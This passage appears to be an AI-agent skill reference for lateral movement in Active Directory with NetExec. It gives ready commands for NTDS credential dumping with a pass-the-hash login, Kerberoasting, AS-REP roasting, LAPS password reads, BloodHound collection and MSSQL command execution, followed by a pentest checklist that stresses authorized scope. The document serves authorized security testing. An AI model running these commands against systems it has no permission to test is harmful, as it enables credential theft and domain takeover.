# moving-laterally-with-netexec — 详细参考（由 SKILL.md 拆分）

# Domain database from a DC (DRSUAPI default, or VSS)
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds vss
```

### 6. Drive AD attacks via LDAP and modules
Use protocol modules to pivot to ticket attacks, delegation, LAPS, and BloodHound ingestion.
```bash
# Kerberoasting and ASREPRoasting
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --kerberoasting kerb.out
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --asreproast asrep.out

# Read LAPS passwords where permitted
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' -M laps

# Collect BloodHound data
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --bloodhound --collection All --dns-server 192.168.1.10

# MSSQL command/query execution
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -q 'SELECT name FROM sys.databases'
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -x 'whoami'
```

### 7. Review the workspace and report
NetExec stores results in a per-protocol SQLite workspace under `~/.nxc/`. Review captured credentials and admin relationships for the report.
```bash
nxc smb -L              # list SMB modules
ls ~/.nxc/workspaces/
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares --log spray_results.log
```

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| NetExec (`nxc`) | Multi-protocol network exploitation | https://github.com/Pennyw0rth/NetExec |
| NetExec Wiki | Official docs and per-protocol flags | https://www.netexec.wiki/ |
| Impacket | Underlying SMB/MSSQL/Kerberos libraries | https://github.com/fortra/impacket |
| lsassy | Remote LSASS extraction (NetExec module) | https://github.com/login-securite/lsassy |
| BloodHound CE | Graph analysis of collected AD data | https://github.com/SpecterOps/BloodHound |
| NetExec Cheat Sheet | Command reference | https://www.stationx.net/netexec-cheat-sheet/ |

## Validation Criteria

- [ ] NetExec installed and `nxc --version` confirmed.
- [ ] Account-lockout policy reviewed before any spraying.
- [ ] Credentials validated across the in-scope host range.
- [ ] `(Pwn3d!)` admin-access hosts enumerated and documented.
- [ ] Shares, users, and password policy collected.
- [ ] Password spraying performed under lockout thresholds with `--continue-on-success`.
- [ ] Command execution tested with an appropriate `--exec-method`.
- [ ] Credential dumping (`--sam`/`--lsa`/`--ntds`) performed only on authorized targets.
- [ ] LDAP attacks (Kerberoasting/ASREPRoast/LAPS/BloodHound) executed where in scope.
- [ ] Workspace results exported and included in the engagement report.
